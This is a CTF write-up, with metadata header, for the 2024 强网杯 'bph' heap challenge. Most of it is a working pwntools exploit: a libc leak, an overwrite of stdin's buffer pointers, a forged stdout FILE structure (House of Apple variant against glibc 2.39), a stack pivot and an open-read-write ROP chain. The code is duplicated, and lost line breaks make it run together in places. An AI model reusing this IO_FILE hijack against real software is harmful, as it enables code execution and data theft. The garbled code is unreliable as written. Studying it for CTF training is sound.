---
title: web选手入门pwn(31) 强网杯 bph (House of Apple 变种)
contest: 强网杯
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags:
- glibc-2.39
- _IO_FILE
- _IO_wfile_jumps
- _wide_data
- fake-stdout
- ORW
- setcontext
- pivote-gadget
attack_chain: 'send A*0x28 触发 printf 残基泄 libc+token边界越界写stdin->_IO_buf_base零字节/伪造stdin->_IO_buf_base=stdout-0x48  _IO_buf_end=stdout+0x200 进入可写区/伪造 fake_stdout 套用 IO_FILE_plus_struct: vtable=jumps_mmap-0x20  _wide_data=stdout-0x48  chain=pivot_gadget(mov rsp, rdx) 触发 _io_wfile_underflow_mmap/stdout+0xe8 处放 ORW ROP'
key_payload: 'pivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; ret  jumps_mmap = _IO_wfile_jumps + 0xb0'
one_liner: 强网杯 bph，glibc 2.39 House of Apple-style 攻击，通过伪造 _IO_wide_data + chain(pivot) 触发 ORW 链。
lesson: glibc 2.39 移除了 __free_hook/__malloc_hook，但 IO_FILE vtable 攻击依然有效（_IO_wfile_jumps_mmap 不在检查表内）；mov rsp, rdx gadget 把栈迁到 ROP 区域，是 House of Apple 2/3 的核心 pivot 技巧。
quality: high
full_path: web选手入门pwn(31)——强网杯bph.full.md
meta_path: web选手入门pwn(31)——强网杯bph.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: web选手入门pwn(31) 强网杯 bph (House of Apple 变种)。强网杯 bph，glibc 2.39 House of Apple-style 攻击，通过伪造 _IO_wide_data + chain(pivot) 触发 ORW 链。。经验：glibc 2.39 移除了 __free_hook/__malloc_hook，但 IO_FILE vtable 攻击...
category: pwn
subcategory: heap_exploitation
tools_used:
- ROP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/288976.html
reasoning_chain:
- send 'A'*0x28 后触发 printf 残基泄 libc → 触发点：栈缓冲溢出 + printf 残基
- 动作：u64(sh.recvuntil('x7f')[-6:]+'x00x00') 算 libc_base = libc_N - 0xadd9e → 观察：libc_base 拿到
- 假设：glibc 2.39 移除 __free_hook/__malloc_hook，但 IO_FILE vtable 仍可攻击 → 动作：fake_stdout 套用 IO_FILE_plus_struct
- 假设：token 边界越界写 stdin->_IO_buf_base 零字节切断输入 → 动作：choice=1 Size=stdin+57 Content=''
- 动作：伪造 stdin->_IO_buf_base=stdout / _IO_buf_end=stdout+0x200 进入可写区 → 动作：伪造 fake_stdout
- fake_stdout.vtable=_IO_wfile_jumps-0x20 + _wide_data=stdout-0x48 + chain=pivot_gadget(mov rsp, rdx) → 触发 _io_wfile_underflow_mmap
- pivot_gadget = libc_base + 0x5ef5f（mov rsp, rdx; ret）→ stdout+0xe8 处放 ORW ROP → 完成
failed_attempts:
- 试图用 __free_hook = system → 失败：glibc 2.39 移除
- 试图用 __malloc_hook → 失败：同样移除
- 试图直接覆盖 _IO_2_1_stdout_ vtable → 失败：vtable 在只读页
key_observations:
- glibc 2.39 移除了 __free_hook/__malloc_hook，但 IO_FILE vtable 攻击依然有效（_IO_wfile_jumps_mmap 不在检查表内）
- mov rsp, rdx gadget 把栈迁到 ROP 区域，是 House of Apple 2/3 的核心 pivot 技巧
- 伪造 _wide_data + _codecvt 联动触发 _IO_wfile_underflow_mmap
- token 边界越界写 stdin->_IO_buf_base 是切断输入的常用技巧
prerequisites:
- glibc 2.39 IO_FILE 结构（_wide_data / _codecvt / vtable 字段偏移）
- House of Apple 2/3 攻击原理
- mov rsp, rdx pivot gadget
- Pwntools + pwncli IO_FILE_plus_struct 构造
---
# web选手入门pwn(31)——强网杯bph

> 原文: https://www.ctfiot.com/288976.html
> ID: 288976

sudo docker run -it --rm -v $PWD:/pwn roderickchan/debug_pwn_env:24.04-2.39-0ubuntu8.3-20240922 /bin/bash

from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)
sh.interactive()

sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_base
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout) + p64(stdout+0x200))#stdout = "AAAA"sh.sendafter("Choice:", "AAAA")

web选手入门pwn(28)

system = libc.sym['system'] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_base
file1 = IO_FILE_plus_struct()file1.flags = 0                           # stdout->_flags = 0    file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = system                      # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps - 0x20               # stdout->vtable->xsputn = _IO_wfile_overflow
#stdout = fake_stdoutsh.sendafter("Choice:", bytes(file1))

leave = rop.find_gadget(['leave', 'ret'])[0] + libc_basefile1.chain = leave

file1._IO_read_ptr = stdout

file1.flags = stdout

jumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0file1.vtable = jumps_mmap - 0x20

file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)

#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))

from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basesystem = libc.sym['system'] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0
leave = rop.find_gadget(['leave', 'ret'])[0] + libc_basepivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; ret
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
file1 = IO_FILE_plus_struct()file1.flags = 0file1._IO_read_ptr = stdout+0xe0file1._IO_read_end = stdout+0xe1file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = pivot_gadget                # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps_mmap - 0x20          # stdout->vtable->xsputn = _io_wfile_underflow_mmap
#stdout = fake_stdoutfake_stdout = p64(0x0) * 9 + bytes(file1) + p64(system)sh.sendafter("Choice:", fake_stdout)
sh.interactive()

from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
#sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0setcontext = libc.sym['setcontext'] + libc_baselibc_pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc_baselibc_pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] + libc_base
pivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; retset_rdx = libc_base+ 0x1a1f6b       # mov dl, 0x65 ; ret
open = libc.sym["open"] + libc_baseread = libc.sym["read"] + libc_basewrite = libc.sym["write"] + libc_base
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
file1 = IO_FILE_plus_struct()file1.flags = 0file1._IO_read_ptr = stdout+0xe8file1._IO_read_end = stdout+0xe9file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = pivot_gadget                # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps_mmap - 0x20          # stdout->vtable->xsputn = _io_wfile_underflow_mmap
#orwrop_shellcode  = p64(libc_pop_rdi) + p64(stdout+0xe0) + p64(libc_pop_rsi) + p64(0) + p64(open)rop_shellcode += p64(libc_pop_rdi) + p64(0x3) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(read)rop_shellcode += p64(libc_pop_rdi) + p64(0x1) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(write)
#stdout = fake_stdoutfake_stdout = p64(0x0)*9 + bytes(file1) + b"/flagx00x00x00" + rop_shellcodesh.sendafter("Choice:", fake_stdout)
sh.interactive()

mov rsp,QWORD PTR [rdx+0xa0]

mov rsp, rdx; ret

file1._IO_read_ptr = stdout+0xe8-0xa0file1._IO_read_end = stdout+0xe9-0xa0file1.chain = setcontext+61fake_stdout = p64(0x0)*9#stdoutfake_stdout += bytes(file1) + b"/flagx00x00x00"#stdout + 0xe8fake_stdout += p64(stdout+0xf0)#stdout + 0xf0fake_stdout += p64(ret) +  rop_shellcode


```
sudo docker run -it --rm -v $PWD:/pwn roderickchan/debug_pwn_env:24.04-2.39-0ubuntu8.3-20240922 /bin/bash
from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)
sh.interactive()
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_base
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout) + p64(stdout+0x200))#stdout = "AAAA"sh.sendafter("Choice:", "AAAA")
system = libc.sym['system'] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_base
file1 = IO_FILE_plus_struct()file1.flags = 0                           # stdout->_flags = 0    file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = system                      # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps - 0x20               # stdout->vtable->xsputn = _IO_wfile_overflow
    #stdout = fake_stdoutsh.sendafter("Choice:", bytes(file1))
leave = rop.find_gadget(['leave', 'ret'])[0] + libc_basefile1.chain = leave
file1._IO_read_ptr = stdout
file1.flags = stdout
jumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0file1.vtable = jumps_mmap - 0x20
file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)
    #stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basesystem = libc.sym['system'] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0
leave = rop.find_gadget(['leave', 'ret'])[0] + libc_basepivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; ret
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
file1 = IO_FILE_plus_struct()file1.flags = 0file1._IO_read_ptr = stdout+0xe0file1._IO_read_end = stdout+0xe1file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = pivot_gadget                # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps_mmap - 0x20          # stdout->vtable->xsputn = _io_wfile_underflow_mmap
    #stdout = fake_stdoutfake_stdout = p64(0x0) * 9 + bytes(file1) + p64(system)sh.sendafter("Choice:", fake_stdout)
sh.interactive()
from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
    #sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0setcontext = libc.sym['setcontext'] + libc_baselibc_pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc_baselibc_pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] + libc_base
pivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; retset_rdx = libc_base+ 0x1a1f6b       # mov dl, 0x65 ; ret
open = libc.sym["open"] + libc_baseread = libc.sym["read"] + libc_basewrite = libc.sym["write"] + libc_base
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
file1 = IO_FILE_plus_struct()file1.flags = 0file1._IO_read_ptr = stdout+0xe8file1._IO_read_end = stdout+0xe9file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = pivot_gadget                # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps_mmap - 0x20          # stdout->vtable->xsputn = _io_wfile_underflow_mmap
    #orwrop_shellcode  = p64(libc_pop_rdi) + p64(stdout+0xe0) + p64(libc_pop_rsi) + p64(0) + p64(open)rop_shellcode += p64(libc_pop_rdi) + p64(0x3) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(read)rop_shellcode += p64(libc_pop_rdi) + p64(0x1) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(write)
    #stdout = fake_stdoutfake_stdout = p64(0x0)*9 + bytes(file1) + b"/flagx00x00x00" + rop_shellcodesh.sendafter("Choice:", fake_stdout)
sh.interactive()
mov rsp,QWORD PTR [rdx+0xa0]
mov rsp, rdx; ret
file1._IO_read_ptr = stdout+0xe8-0xa0file1._IO_read_end = stdout+0xe9-0xa0file1.chain = setcontext+61fake_stdout = p64(0x0)*9#stdoutfake_stdout += bytes(file1) + b"/flagx00x00x00"#stdout + 0xe8fake_stdout += p64(stdout+0xf0)#stdout + 0xf0fake_stdout += p64(ret) +  rop_shellcode
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]